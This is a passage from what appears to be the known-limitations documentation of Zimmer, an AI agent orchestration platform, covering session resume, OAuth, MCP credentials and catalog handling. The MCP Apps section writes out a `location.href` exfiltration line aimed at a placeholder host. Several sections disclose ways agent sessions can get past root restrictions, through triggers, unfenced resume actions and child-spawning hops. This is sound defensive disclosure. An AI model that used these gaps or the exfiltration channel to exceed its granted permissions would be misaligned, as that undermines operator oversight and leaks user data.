`sessions.session_id` so transcript polling stops chasing the abandoned rollout. Codex mints the
replacement UUID itself, and Zimmer only learns it when `capture_runtime_session_id!` reads it off
the new rollout — a window of one poll interval where the session has no runtime id at all.

Inside that window `is_resume` is forced false (`AgentSessionJob` requires `session_id.present?`),
so a follow-up arriving right then spawns fresh and carries its prompt instead of resuming. That is
the correct degradation — a resume with no target cannot work — but it is a turn that restarts
rather than continues, and the user sees the prompt replayed in the timeline.

Reattachment also depends on `CodexTranscriptSource#fallback_transcript` matching the rollout's
recorded `cwd` against the session's `working_directory`. A session whose clone moves in the same
window has no way to find its own rollout and waits until one appears.

### A fresh start after a lost rollout is silent, and the agent has no history

`CODEX_HOME` is a durable volume, so a deploy does not destroy in-flight Codex conversations. A
rollout can still go missing — a recreated volume, a disk sweep, Codex's own retention — and when
it does, `ProcessLifecycleManager#handle_failed_resume_recovery` starts a new
conversation carrying only the prompt that triggered it. Zimmer's timeline stays whole (the poller
carries the stored transcript forward), the process exits 0, and the session parks in `needs_input`
exactly as a completed turn does. Nothing in the *conversation* says the history is gone.

So the user sees an agent that has forgotten what it was doing, with no way to tell that apart from
an agent that answered badly. The recovery is logged at `warning` on the session, which is one pane
away from where the symptom appears. Restoring the prior transcript into the fresh conversation, or
marking the discontinuity in the timeline, is unbuilt.

### The approval gate can only be verified as far as Zimmer's own doorstep

`ELICITATION_REQUEST_URL` and `ELICITATION_SESSION_ID` reach a stdio MCP server on all three runtimes —
`CliSpawnEnv#apply_elicitation_env` puts them on the agent process, and
`RuntimeConfigPostProcessor#inject_elicitation_env!` writes them into the server's own `env` table in
the generated config, which is the only channel Codex honors. `ElicitationEndpointHealthCheckJob` proves
every 5 minutes that the endpoint answers from the host agents run on. Neither proves that a given
MCP server *used* those variables: a server that hard-codes its own URL, or one already running from
before the change, still posts into the void and still returns a redacted value. What is guaranteed
now is that the failure is not silent on Zimmer's side — the system prompt of every session spawned
while the gate is down says so, so a redaction is never read as a policy decision. A session already
running when the gate breaks reads the status from its spawn and will not learn of it.

Fixed in [#55](https://github.com/tadasant/zimmer/issues/55) and
[#397](https://github.com/tadasant/zimmer/issues/397). What survives is the edge of what Zimmer
can verify from its own side, which no issue closes.

### On Codex, a clone's `.env` reaches the agent but not its stdio MCP servers

Codex rebuilds every MCP server's environment from `HOME`/`LANG`/`PATH`/`PWD`/`SHELL` plus what the
config entry's own `env`/`env_vars` name, so nothing Zimmer exports to the agent process is inherited.
Zimmer bridges exactly the names it knows a server needs: the `ELICITATION_*` variables (written
into each stdio entry's `env` by `RuntimeConfigPostProcessor`) and `SSH_PRIVATE_KEY_PATH` (forwarded
via `env_vars` by the Codex post-processor). Anything else an operator puts in a clone's `.env` reaches
the agent and, on Claude, the servers that inherit its environment — but on Codex it stops at the agent.

The asymmetry is silent, which is the part worth knowing: a server that reads a variable it never
received behaves as if the operator never set it. A catalog entry that names the variable in its own
`env`/`env_vars` is the way through today.

### The npx bin-permission repair only reaches Claude sessions, and only on the next launch

`NpxBinExecutableGuard` restores the execute bit on `_npx` bin targets that a package published
without one — the failure that orphaned production session 4388 three times in 31 minutes
([#467](https://github.com/tadasant/zimmer/issues/467)). Two edges come with it.

It runs from `ClaudeSpawnEnv#configure_mcp_env`, so a Codex session never calls it. A Codex session's
npx servers do install inside the clone — `RuntimeConfigPostProcessor` writes `NPM_CONFIG_CACHE` into
each entry's own `env` table, so the guard's clones-base safety check would accept the paths — but
nothing on the Codex spawn path invokes the guard, so a bin target that lost its execute bit there
stays broken.

And it repairs the tree it finds on the way *in*, so a package that installs broken during a launch
is repaired on the launch after it — the retry `AgentSessionJob#schedule_mcp_retry` already schedules.
A session recovers by itself; it does not connect on the first attempt.

### A cold clone pays the npm download for every npx MCP server

`RuntimeConfigPostProcessor` points each npx MCP server's `NPM_CONFIG_CACHE` at the session's clone.
`NPM_CONFIG_CACHE` moves the *whole* npm cache, not just the `_npx` install root — `_cacache`, the
tarball store, comes with it. So the packages `bin/preinstall-mcp-packages` warms into the image's
`~/.npm` at build time are not read by any MCP server, and the first launch in a fresh clone fetches
every one of them from the registry.

All three runtimes have room to absorb it — three minutes by default, from `MCP_TIMEOUT=180000` on
Claude, `startup_timeout_sec = 180` on every Codex stdio entry
([#702](https://github.com/tadasant/zimmer/issues/702)) and `"requestTimeoutMs": 180000` on every
Pi one ([#844](https://github.com/tadasant/zimmer/issues/844)) — so the cost is a delay rather than
a dropped server. A catalog entry that declares its own `startup_timeout_sec` moves its own budget
([MCP servers](/air/mcp-servers/#startup_timeout_sec-how-long-this-server-gets-to-start)), which on
Claude and Pi can only lengthen — so three minutes is the floor on those two and can be as much as
ten. The price of the wider budget is that a genuinely hung server holds the handshake
for three minutes — up to ten, where an entry declares that — instead of Codex's 30-second default
or Pi's 60-second one, and on Pi it also
raises the ceiling on every tool call, because the adapter's one `requestTimeoutMs` covers the
whole connection rather than just its opening.

**Pi's npx servers get less of that budget than the other two runtimes, and part of their cold
start is outside Zimmer's reach entirely.** `pi-mcp-adapter` intercepts a `command` of `npx` or
`npm` and resolves the package to a concrete bin path itself before any transport exists
(`resolveNpxBinary`, `npx-resolver.ts`), so that phase is not an MCP request and no
`requestTimeoutMs` applies to it. Two consequences follow. It reads the npm cache of the *Pi
process* — `NPM_CONFIG_CACHE` on `pi` itself, falling back to `npm config get cache` — rather than
the entry's own `env`, and `PiRuntimeAdapter` sets no such variable, so the resolver looks in the
host-shared `~/.npm`, which is the thing the per-entry pinning exists to avoid. And on a cache miss
it runs `npm exec` under its own hard, non-configurable 30-second cap, killing the install on
timeout before falling back to plain `npx`. The fallback download is covered by the budget; the
30 seconds before it are not, and a kill mid-write lands in a cache every session on the box
shares. Giving the Pi *process* a clone-scoped `NPM_CONFIG_CACHE` would point the resolver at the
clone and is the obvious next step; it is not done today.

The download itself is still paid, and un-pinning the cache is not the fix — a host-shared cache is
what [#595](https://github.com/tadasant/zimmer/issues/595) was. Seeding the clone from the image's
`_cacache` is the obvious alternative and is worse than it looks: hardlinking a 173MB
content-addressed store into every live clone shares inodes that all of them would then be writing
through, so one bad write corrupts the store every session depends on, and copying it outright
roughly doubles what the clones directory holds. Warming the clone at prepare time, by running the
npx installs during `air prepare` rather than at the first MCP handshake, remains open.

### Extensions ship, but nothing proves one *works* in a built image

`.dockerignore` no longer excludes `/app/extensions/*/`, and
`scripts/assert-extensions-shipped.sh` fails the build and the PR if anything puts that exclusion
back — see [Extensions do ship in the image](/operate/deploying/#extensions-do-ship-in-the-image).
What the guardrail asserts is *presence*: the tree arrived, a subdirectory of it arrived, and no
directory under it arrived hollow.

Because there is no real extension to key on, the subdirectory it looks for is a marker directory it
ships itself, and that is the seam in the outcome check: a `.dockerignore` that excluded
`/app/extensions/*/` and then whitelisted `!/app/extensions/image_canary/` would leave a context
holding the canary and nothing else, and both Docker-side callers would pass. What catches that is
`test/infra/extensions_shipped_in_image_test.rb`, which rejects *any* `.dockerignore` pattern naming
the path, negations included — so the check exists, but it is on the Ruby side, not on the half that
gates the published image. The first real extension in the tree closes the gap by giving the script
something other than its own canary to find.

It does not assert that a registered extension resolves and loads at boot, because there is still no
extension *in this repository* to assert it about. `BUILTIN_EXTENSION_CLASSES` is no longer empty —
it names `PtyTransportExtension` — but that extension's code is deliberately withheld from this repo
and arrives in the deployment that has it as a
[read-only bind mount](/extend/extensions/#enable-install-remove), so `app/extensions/` in the image holds only
`CLAUDE.md` and the marker directory the check keys on. What the test suite pins here is the
*negative*: `test/services/zimmer/extension_registry_test.rb` asserts that no built-in name resolves
in this checkout and that `register_builtins!` therefore registers nothing, and
`test/services/claude_print_runner_test.rb` asserts the seam falls back to `NativeClaudePrintRunner`
with the real built-ins registered.

The first extension **vendored into** `app/extensions/` after
[#91](https://github.com/tadasant/zimmer/issues/91) is still the first one to exercise the positive
path end to end. The class of failure open until then is a Zeitwerk one — a file whose constant does
not match the collapsed path, so `safe_constantize` returns `nil` and the registry skips it exactly
as it would skip a deleted directory. Presence in the image no longer hides that; nothing else
catches it either.

A **bind-mounted** extension fails differently, and in one respect better. `production.rb` sets
`eager_load = true`, so a mounted file whose constant does not match its path raises
`Zeitwerk::NameError` while the container boots: it never answers the health gate, kamal-proxy keeps
the old container serving, and the deploy fails loudly rather than degrading. What stays quiet is
the delivery itself — an empty, absent or wrongly-named host directory is indistinguishable from an
extension that was never meant to be there. That is the same property that makes the mount safe to
declare on every other host, so it is a trade rather than an oversight, but it does mean a broken
sync leaves production silently on the native backend.

### The login flow screen-scrapes a TUI

Hardcoded: the command (`claude auth login --claudeai`), the authorize-URL host regex, the literal
prompt `/Paste code here/i`, and the binary path `/home/rails/.local/bin/claude`. Codex likewise, with a
device-code regex tuned to an *observed* 4–5 character split.

🔴 This has already fired once. The Claude CLI self-updates on the worker, and `2.1.232` started
rendering its authorization link as an OSC 8 hyperlink — which the parser mangled into a URL no
browser could open, breaking UI logins with no Zimmer deploy and no failing test. What the parser
now tolerates, and how to capture output when it drifts again, is in
[Auth harness](/auth/harness/#the-screen-scrape-is-only-as-stable-as-the-clis-output).

Tracked in [#58](https://github.com/tadasant/zimmer/issues/58).

### A timed-out headless `claude -p` child gets ~2 seconds to die, then it is the reaper's problem

`NativeClaudePrintRunner` — the default print-mode backend, behind `SessionTitleJob` and
`SendPushNotificationJob` — reaps its child after a timeout, but on a bound: poll
`wait(pid, WNOHANG)` for `REAP_WINDOW` after SIGTERM, escalate to SIGKILL, poll once more. That bound
is deliberate — the reap runs after the run's own `Timeout` budget is spent, and a blocking wait on a
child that ignores SIGTERM would hang a GoodJob worker thread. The cost is that a child which
survives SIGKILL (uninterruptible sleep, say) is left uncollected until `ZombieReaperJob`'s next
tick, with a WARN naming the pid. The windows are the caller's latency: a timed-out call whose child
dies on SIGTERM returns immediately, one that has to escalate costs about a second more, and one that
answers neither signal costs about two.

The `pty_transport` extension substitutes its own print runner, which this teardown path does not
cover.

---

## Claude Code OAuth (inherited assumptions)

Zimmer automates OAuth on top of Claude Code's undocumented internal implementation. Every item here
is a fact about someone else's private code that can change without notice. Last verified against CLI
`2.1.177` on 2026-06-14 — as of this writing, that's stale.

1. The CLI keeps identity (`~/.claude.json`) and tokens (`~/.claude/.credentials.json`) in files
   of different durability, and reading the local identity to decide who owned the shared tokens
   *"gets a confidently wrong answer"* on the wrong container — the 2026-06-11 cross-account
   contamination outage. Zimmer no longer reads or writes either file for a session's subscription
   credential; the row is handed straight to the process. The fact stays on the list because the
   login flow still captures both files out of a scratch directory.
2. `oauthAccount` has two shapes across CLI versions (String vs Hash). Both must be handled.
3. Hardcoded constants: token endpoint, the CLI's public client ID `9d1c250a-…`, authorize hosts,
   redirect URI, scopes, PKCE method. If any change, refresh and login break wholesale.
4. Refresh tokens are single-use and rotate. The new pair must be persisted atomically or the account
   bricks.
5. Rotating also kills the sibling access token, so a future `expiresAt` is *not* proof a token is
   live. Zimmer's `token_expired?` still keys purely off `expiresAt`; what defends against it is
   that only Zimmer rotates — a session is never handed the refresh token — plus the non-consuming
   probe (`access_token_honored?`) before an account is admitted.
6. A credential set without a refresh token is unrecoverable.
7. The CLI refreshes tokens on its own, mid-session, when it holds a refresh token. Zimmer's
   answer is to never hand it one: a session gets an access token through `CLAUDE_CODE_OAUTH_TOKEN`
   and its own `CLAUDE_CONFIG_DIR`, so the DB row is the only copy of the chain and there is nothing
   to scrape back. That rests on the CLI honouring the variable at all, which is measured behaviour
   on 2.1.240/2.1.241, not documented behaviour.
8. Under that variable the CLI writes a `.credentials.json` holding `mcpOAuth` and nothing else.
   Zimmer relies on that — it is what makes the remaining file unable to destroy a subscription
   chain — and nothing detects a CLI version that starts writing `claudeAiOauth` into it again.
9. Token lifetime ~8h — inferred, not specified.
10. `invalid_grant`'s two meanings are separated only by an `error_description` string. Zimmer keys on
    `/expired|revoked/i` to tell a dead credential from a spent value; if Anthropic reworded that
    field tomorrow, every rejection would read as merely stale and a genuinely dead account would take
    three strikes to surface instead of one. Nothing detects the rewording.

Tracked in [#58](https://github.com/tadasant/zimmer/issues/58). None of this can be *fixed* — there is
no public API to fix it against — so the issue asks for a canary that fails loudly when one of these
facts stops being true.

---

## A dead pooled account takes about half an hour to reach you

`ClaudeAccount#refresh_token!` no longer condemns an account on a single `invalid_grant` whose body
says only that the value it presented was rejected — that mistake accounted for 14 of the 15
`needs_reauth` marks over an eleven-day window and made Tadas re-authenticate the same live account
four times in a fortnight ([#530](https://github.com/tadasant/zimmer/issues/530)). It now takes three
such rejections, spread across at least 15 minutes each, before the account is marked.

The cost is on the other side. An account whose credential really is dead, in the way that does *not*
say "expired" — revoked out of band, or a chain Zimmer orphaned before the fix landed — stays `active`
for at least half an hour while the strikes accumulate. Two strikes must be 15 minutes apart and the
sweep runs every 5 minutes, so the floor is ~30 minutes and the usual case is 30–45. During that
window rotation can hand a session an account that cannot mint an access token. It is a deliberate
trade of a slower true positive for far fewer false ones, not an oversight.

The strikes are on `claude_accounts.stale_refresh_failures` / `last_stale_refresh_failure_at`. They
are on the account's Administrate record page but **not** on `/inference`, which is where anyone actually
looks — so "why is this account still active when every refresh fails?" is a question `/inference` cannot
answer.

---

## MCP

### An outage of Zimmer's own `/mcp` now fails every in-flight session at once

`zimmer-self-session` is injected into nearly every session and points at the Zimmer instance serving that session. Losing it is a session-level failure rather than a degradation — that is the point of [Except the one server whose loss IS the session](/air/mcp-servers/#except-the-one-server-whose-loss-is-the-session), and it is what stops a router from running to completion having started nothing. The cost is that the blast radius of an outage of Zimmer's *own* endpoint is now every live session rather than none.

Any outage longer than the retry ladder (`RetryBudget::MCP_CONNECTION`, ~3.5 minutes) does it: a bad deploy, a kamal-proxy gate that stays shut, an `API_KEYS` rotation that leaves the deployed key behind. [#1167](https://github.com/tadasant/zimmer/pull/1167) was exactly this shape and lasted two hours. Before, those sessions ran on uselessly; now they fail. Failing is the better of the two — a failed session is restartable and visible, while a silent no-op is neither — but it is a real change in what an outage costs, and the restarts are a human's to trigger.

Two second-order effects worth knowing before you read the alerts:

- **Each trigger-created session that fails raises its own `error`-level `OrphanedTriggerFire` report.** One Zimmer blip therefore becomes an N-fold ERROR burst in obs and `#alerts`, where N is however many trigger sessions were live. The MCP-connect paths themselves stay at `.warn` precisely to avoid adding to it, but the failures are genuine and each one names a work item that was dropped.
- **A restart while the endpoint is still down costs a full ladder before it fails again** — ~3.5 minutes per attempt, since `mcp_retry_count` is cleared on restart. Fix the endpoint first, then restart.

Nothing throttles or coalesces this today. If it becomes a problem the shape of the fix is a fleet-level circuit breaker — when *every* session is losing the same Zimmer-native server, that is an outage rather than N per-session verdicts — but a breaker that gets its own outage detection wrong would resurrect the silent no-op, so it is deliberately not guessed at here.

### A restricted connection is locked out of MCP servers at spawn, but not through a trigger

`allowed_agent_roots` locks a connection to its roots' exact default MCP servers, and
`Mcp::Tools::StartSession#enforce_root_constraints!` enforces that for both routes into the
server set — the `mcp_servers` parameter and the `plugins` parameter, since a plugin bundles
servers of its own. `Mcp::Tools::ActionSession` refuses `change_mcp_servers` and `change_plugins`
on the same connection.

`Mcp::Tools::ActionTrigger` is the gap. It refuses `catalog_plugins` on a restricted connection
(`reject_restricted_plugin_list!`) but has never carried the `mcp_servers` equivalent: a restricted
connection may create or update a trigger on an allowed root naming any servers it likes, and
`Trigger#sync_mcp_servers!` stamps them onto every session that trigger spawns. So the lock holds
at spawn and through the mid-life change actions, and not through a trigger.

This is reachable today. `catalog-management` resolves with `default_subagent_roots` —
`["catalog-mgmt-configs", "catalog-mgmt-proctor", "catalog-mgmt-research", "catalog-mgmt-save"]`,
computed by AIR from those roots' own `default_in_roots` rather than written in `roots.json` — and
that is what makes `RuntimeConfigPostProcessor#inject_subagent_server!` write a restricted
connection into every `catalog-management` session. The injected URL passes no `tool_groups`, so it
carries the full surface, `action_trigger` included. The gap is noted in `ActionTrigger`'s own
comment as a deliberate non-closure and is not tracked by an issue.

### A restricted connection cannot spawn from a session outside its roots, but can still resume one

`allowed_agent_roots` fences three `action_session` actions against the session they name
([#1118](https://github.com/tadasant/zimmer/issues/1118)): `fork`, which copies the source session's
repository and MCP servers onto a new row; `regenerate_status_summary`, which reaches the same
`ForkSessionService` under another name and then dispatches an agent turn on what it creates; and
`restart`, which runs a row's agent and re-clones the repository outright when the session never got
a clone.

The fence places a session by the agent root its row names (`metadata["agent_root_key"]`), and by
nothing else. It deliberately does not use `Session#agent_root_key`, whose fallback arm infers a
root from `git_root` + `subdirectory`: every root in this catalog shares one repository URL with an
empty subdirectory, so that arm answers with the first of them for any session carrying no key —
which is every fork, since `ForkSessionService` builds the fork's metadata fresh. A restricted
connection therefore cannot fork or restart a fork, or any pre-`agent_root_key` session. That is a
refusal it could not previously hit, and it is the direction a fence should err in: the alternative
admits a fork of any root's session to a connection allowed only `zimmer`.

Three other actions put an agent into a session's repository and are **not** fenced: `follow_up`
(which also chooses the prompt), `start_now`, and `unarchive`. Each of them acts on a session that
already exists and already has a repository, rather than creating one or choosing where it points —
but the agent that then runs is running somewhere the connection was fenced out of, so the
distinction is one of degree. They were left out deliberately rather than missed: fencing
`follow_up` in particular would change how an orchestrating session may reach the sessions it did
not spawn, which is a policy decision about fleet orchestration and not the hole #1118 reported.
`archive` and `bulk_archive` are unfenced too, and they are destructive rather than spawning — they
end another root's session and delete its clone.

All of this is reachable today, by the route the entry above names: `catalog-management` resolves
with `default_subagent_roots`, so its sessions carry a full-surface, root-restricted connection.

### Codex MCP credentials are a reverse-engineered format, written on every spawn

`CodexMcpCredentialWriter` exists entirely to work around two open upstream Codex bugs
([#15122](https://github.com/openai/codex/issues/15122),
[#17265](https://github.com/openai/codex/issues/17265)). Its format was read out of
`codex-rs/rmcp-client/src/oauth.rs @ rust-v0.133.0`, and it writes two mutually incompatible schemas
(file vs macOS Keychain). The Keychain path has never been runtime-verified — all workers are Linux.

Tracked in [#63](https://github.com/tadasant/zimmer/issues/63).

### The Claude credential-key algorithm is a string copy of a private internal

`McpOauthCredential.compute_credential_key` replicates Claude Code's `server|SHA256(compact_json)[0,16]`
key format, including string-munging `": "` → `":"` to fake compact JSON. If Claude Code changes it,
every stored credential becomes unfindable — and the symptom is "the agent says it needs authorization,"
not an error.

A canary test in `test/models/mcp_oauth_credential_test.rb` pins the literal key for two fixed server
configs, so a change to Zimmer's side of the algorithm fails loudly and names the hashed preimage.
It cannot detect the other direction: if Claude Code changes *its* algorithm, the canary stays green
and lookups start missing.

Fixed in [#62](https://github.com/tadasant/zimmer/issues/62), which added that canary. The direction it
cannot cover is permanent — there is no public spec to pin the other side against.

### Codex MCP status reimplements a Rust function in Ruby

`CodexMcpStatusDetector` mirrors `codex-rs`'s `MCP_TOOL_NAME_DELIMITER = "__"` and its
`sanitize_responses_api_tool_name` character rules.

Tracked in [#63](https://github.com/tadasant/zimmer/issues/63).

### Servers without `offline_access` issue one-shot credentials

Scope acquisition just joins the server's advertised `scopes_supported`. No `offline_access` ⇒ no refresh
token ⇒ the credential is single-use and dies with no way to refresh, and Zimmer does not ask for a scope
the server did not advertise.

What it no longer does is stay quiet about it. A token exchange that leaves no refresh token on the
credential sets `refresh_token_unsupported`, and the Connectors row says the credential cannot be
renewed and will need authorizing again — while the row is still green, rather than months later as an
unexplained re-auth. The chore is real; the surprise is not.

A re-authorization that omits a refresh token keeps the one already stored, and the flag is derived
from what survives the exchange rather than from the response alone — a server that mints a refresh
token on first consent and omits it when re-authorizing a live grant stays renewable
([#309](https://github.com/tadasant/zimmer/issues/309)).

Tracked in [#64](https://github.com/tadasant/zimmer/issues/64).

### "Assume OAuth might be required" — now only when nobody could tell

Zimmer records what a remote server actually advertised about OAuth
(`McpServerOauthRequirement`, one row per server config) from the two paths that already ask it:
the spawn gate and `McpOauthProbe`. The surfaces that cannot make a network call read that record
rather than assuming. See
[What the server advertised, recorded](/auth/mcp-oauth/#what-the-server-advertised-recorded).

What remains is the third branch, and it is deliberate. A server that has never been probed, that
could not be reached, or that answered the unauthenticated `GET` with anything other than a
`Bearer` challenge or an MCP-shaped `2xx` is `undetermined`, and undetermined still means *assume
OAuth might be required*. Erring the other way is the worse failure: a server wrongly decided not to need OAuth
never gets credentials and fails at the point of use, silently, where the over-eager assumption
merely offers an Authorize button nobody needed. `advertised_not_required` also expires after seven
days, so a server that starts requiring OAuth falls back to the assumption rather than being
believed indefinitely.

So the guess is still there for servers nobody has been able to classify — it is just no longer
indistinguishable from a fact, on the Connectors row or in the spawn log.

Originally [#103](https://github.com/tadasant/zimmer/issues/103).

### "Is this a credential header?" is a word list

🟡 `McpOauthCredentialInjector::CREDENTIAL_HEADER_PATTERN` decides whether a remote server
authenticates with a static header by looking at the header's *name*: `authorization`, `auth`,
`api-key`/`apikey`, `token`, `secret`, `password`, `credential(s)`, as whole `-`/`_`-delimited
parts. A vendor header spelled with none of those words — Azure's `X-Subscription-Key`, say —
is not recognized, and the server is classified OAuth-capable: the Connectors page offers an
Authorize button that no consent screen can satisfy, and the post-spawn classifier files its
401 as `oauth_required`. Adding the word is a one-line fix; the point is that nothing detects
the miss for you.

The list is deliberately narrow, because the opposite error is worse: a routine header read as
a credential (`Idempotency-Key`, had `key` counted on its own) hides the Authorize button on a
server that genuinely needs one, leaving no way to authorize it at all. There is no signal in
the catalog schema that would settle this outright — an explicit `auth` block per entry would,
and does not exist.

An exact two-name list (`Authorization`, `X-API-Key`) is what shipped before, and it is why the
`google-maps` entry's `X-Goog-Api-Key` rendered "Needs authorization" beside the very key that
authenticates it.

### A re-authorization cannot reach the agent process that is already running

🟡 Claude Code reads its MCP servers once, at launch. When a server's OAuth grant is renewed while a
session is `running` or `needs_input`, the live agent process has no connection to that server and
cannot be given one: the only mechanism that would is killing the process and starting another, which
is the double-process failure [#400](https://github.com/tadasant/zimmer/issues/400) describes. So the
tools stay missing for the rest of the current turn no matter what Zimmer does.

What Zimmer does instead ([#195](https://github.com/tadasant/zimmer/issues/195)) is inject the fresh
credential into the runtime store immediately, record the server under
`metadata["mcp_oauth_reconnect"]`, and say so twice — a notice on the session page with a button that
sends (or queues) an ordinary follow-up, and a line in the session's own timeline. The reconnect is
the next spawn's `gate_and_inject_oauth!`.

Two things that leaves. The next turn is genuinely required: a session mid-turn on work that needs
those tools finishes that turn without them. And the notice reaches only the session the OAuth flow
was started from — a grant renewed from the Connectors page is shared by every session wiring that
server and notifies none of them.

### The fallback `client_id` is the literal string `"zimmer"`

Used only when neither a statically-configured client id nor a DCR endpoint is available.
**Unclear / needs confirmation:** whether any real server accepts this.

Tracked in [#64](https://github.com/tadasant/zimmer/issues/64).

### A silently-rejected credential still has no re-auth path

To stop the dead "Authorize" button, a `401` from a server Zimmer already holds an `active` credential
for is treated as "the runtime didn't honor the injected token" — it clears the needs-auth cache and
retries rather than parking `oauth_required`. That is right for the common case (the host-global
needs-auth cache short-circuited the connection), and a provider that *says* the credential is dead
is now carved out: an error matching `REFRESH_TOKEN_REJECTED_PATTERN` (a `Token refresh failed with
<grant error>` / `Invalid refresh token` shape) retires the credential in both the DB and the runtime
store, and parks `oauth_required`.

What remains is the silent case: the server rejects the access token — revoked, or its scopes changed
— and reports only a bare `401` with no grant error, while the DB copy still looks `active` and the
runtime never attempts a refresh that would name the failure. That retries to the limit and then
[leaves the server out](/air/mcp-servers/#when-a-server-cannot-connect-the-server-is-left-out-not-the-session)
(raw error surfaced in the session log) with **no** Authorize button offered; the session runs on
without that server's tools, and the credential must lapse or be deleted before re-authorization is
presented again. The predicate is still `McpOauthServerAuthorization.authorized?` (active credential
exists), not "the server accepted it".

A runtime that phrases a rejected refresh differently than the pattern expects falls into this same
silent case. That is the deliberate direction to fail in — the alternative, matching a bare
`invalid_grant` anywhere in the error, retires a healthy credential whenever a server reports a
*downstream* provider's grant error, which is an unresolvable re-auth loop rather than a slow one.

### An MCP server that advertises an `http://` token endpoint cannot be authorized at all

`token_endpoint` decides both where the OAuth grant goes and whether TLS is used, and the grant
carries the `client_secret` in the form body — so Zimmer refuses any endpoint that is not `https`
with a host, at initiate, on the pending flow, on the credential, and in `post_form`. The rule is
exceptionless: there is **no loopback carve-out**, so a local MCP server on `http://localhost` that
runs its own OAuth cannot be authorized through Zimmer.

That is deliberate rather than an oversight. The endpoint is discovered from the MCP server's own
RFC 8414 metadata, so a carve-out would be an exception the remote server gets to trigger, and a
remote server naming this host's loopback would be aiming a POST carrying an operator-supplied
client secret at whatever answers on Zimmer's own port. The cost is real and lands on local
development only: the refusal is a flash message naming the endpoint, not a silent failure. A local
server that terminates TLS, or one fronted by strad, works normally.

Note also that `McpOauthCredential#can_refresh?` is false for such an endpoint, so a credential that
somehow holds one reads as **Needs authorization** rather than being retried — which is the point,
since `refresh!` POSTs before it saves and a retry would leak the secret *and* lose the rotated
refresh token.

### MCP Apps renders only for remote servers, and only for servers named by hand

[MCP Apps](/extend/mcp-apps/) support is off by default and per-server opt-in, which is deliberate
and documented there. Three narrower things are limitations rather than design:

**A stdio MCP server can never show a view.** Reading a `ui://` fragment means making a
`resources/read` call, and for a stdio server that means the *web process* spawning the server — a
process-spawning primitive on the request path. So `McpApps::Policy` offers only remote
(`streamable-http` / `sse`) servers for opt-in, and most of the catalog is stdio. A stdio server that
ships views is simply not renderable.

**Zimmer is not the spec's double-iframe sandbox proxy.** SEP-1865 describes a host page plus a
separate-origin *Sandbox* holding `allow-scripts allow-same-origin`, with the View inside it. Zimmer
serves the fragment from its own endpoint under a CSP `sandbox` directive instead, so the document is
opaque-origin however it is loaded and never holds `allow-same-origin` at all. The isolation is
tighter, but the reserved `ui/notifications/sandbox-proxy-ready` and `sandbox-resource-ready`
messages are not implemented, and a view that insists on the proxy handshake will not render.

**A view's proxied `tools/call` needs no per-call consent and leaves no trace you can read.** The
proxy forwards only tools the server marked `visibility: ["app"]`, only to the one server the
fragment came from, and only up to `McpApps::RequestThrottle`'s ceiling — but within that, a view may
call whatever it likes, whenever it likes, and the only record is the MCP server's own logs. The spec
allows a host to require user consent per call; Zimmer does not, on the grounds that the per-server
allowlist is where the consent was given. That is a real trade, and it is the reason the allowlist is
the feature's load-bearing control rather than a convenience.

**A view can still exfiltrate what it was given, by navigating itself.** The CSP closes `connect-src`
by default, so a view that declares no `connectDomains` cannot `fetch` anywhere — but no CSP
directive stops a sandboxed frame navigating *itself*, and `location.href = "https://elsewhere/?" + data`
is a working channel for whatever the host handed it, chiefly the tool result. It is loud (the panel
visibly becomes somebody else's page), it cannot reach anything Zimmer holds, and it is contained by
the fact that an operator named the server — but "no network of any kind" is not literally true, and
`navigate-to` was removed from the CSP spec, so there is nothing to turn on that would make it so.

---

### An opt-in tool group decides what a session is offered, not what it can reach

`gate_decisions`, `work_backlog` and `outcome_analyses` are opt-in so that no unscoped connection
carries their writes. That keeps a session from holding `record_gate_decision` or
`action_outcome_analysis` in passing. It does not stop a session that holds `start_session` or
`action_trigger` from spawning a child with `zimmer-outcome-analyses` (or either of the others)
attached. An analysis session, which carries `zimmer-sessions`, is one such hop away from starting
analyses. The API key is also shared by the whole fleet, so a caller that composed its own
`?tool_groups=` URL would get the group outright.

What bounds an agent that takes the hop is the tool's own limits (for Outcomes: 3 in flight per
batch, one MCP batch at a time, `expected_count`, 3 single analyses in flight), not the group.

### The Outcomes agent limits count sessions, and one of them is a check rather than a lock

"One running MCP batch" is held by a partial unique index, so racing `analyze_all` calls cannot both
win. The single-`analyze` limits are not: "at most 3 in flight" and "not while this transcript is
already being analyzed" count live analysis sessions and then spawn, so two calls landing in the
same instant can both pass. The cost is one extra spot session per collision, not a runaway.

Both count only analyses younger than three hours (`PumpBatch::STALE_AFTER`). That is what stops
one stuck in `needs_input` from holding a slot forever. It also means a legitimately slow analysis
(one held that long in the spot queue, say) stops counting, and a fourth can start beside it.

## AIR catalog

### A dangling reference fails the entire test suite

🔴 AIR exits 0 when it drops an unresolvable reference. Zimmer's only detection is
string-matching AIR's stderr for `"references unknown"` + `"Dropping the reference"`.
`air_catalog_service.rb:23-39` is candid: *"a string copy, not a stable contract… brittle, but AIR
exposes no machine-readable signal."*

And because `test/test_helper.rb` pre-warms the catalog before `parallelize` forks, a single dangling
reference reddens every session-creating test at once. `CONTRIBUTING.md`: *"suspect the catalog before
your change."*

If AIR ever rewords that warning, Zimmer quietly starts accepting degraded catalogs.

Tracked in [#66](https://github.com/tadasant/zimmer/issues/66).

### Two artifacts sharing a short id cannot be activated in the same session

Zimmer holds a local `slack` MCP server and a composed `@reframe-systems/agentic-engineering/slack`
as two distinct entries, and either is selectable on its own
([#208](https://github.com/tadasant/zimmer/issues/208)). **Both at once is not.**

`air prepare` materializes an artifact under its *short* name — the `mcpServers` key in the session
clone's `.mcp.json`, the directory name under `.claude/skills/` — so activating both makes AIR exit
non-zero:

```
Error: MCP server shortname collision: both "@local/slack" and "@acme/catalog/slack" are
activated and would write to the same target name "slack". Add one to air.json#exclude or
activate only one of them.
```

That is AIR's constraint, not Zimmer's, and lifting it means giving the adapters a disambiguated
target name — work that belongs in `pulsemcp/air`. Zimmer's part is to fail early instead of at
spawn: `CatalogArtifactReferences` rejects the pair at save time, so it is a form error on the
picker rather than a session that starts and immediately bricks.

The same applies to a skill a session activates under a contested short id: whichever one is
selected lands at `.claude/skills/<short-id>/`, so a runtime slash-command like `/open-pr` still
names the short id and cannot distinguish the two.

**OAuth does not reach a contested server yet.** A runtime keys its credential store by the name it
sees in `.mcp.json` — the short id — while Zimmer keys `McpOauthCredential` by its own identifier,
which for the losing side of a collision is `@owner/repo/<id>`. The two keys differ, so a token
Zimmer holds for that server is written where the agent will not look for it. Nothing regresses:
every artifact in a single-scope catalog has identical short id and Zimmer identifier, so the two
keys are the same string everywhere today. Closing it means mapping Zimmer's identifier to the
runtime's target name at the credential-writing boundary — `McpOauthCredentialInjector`,
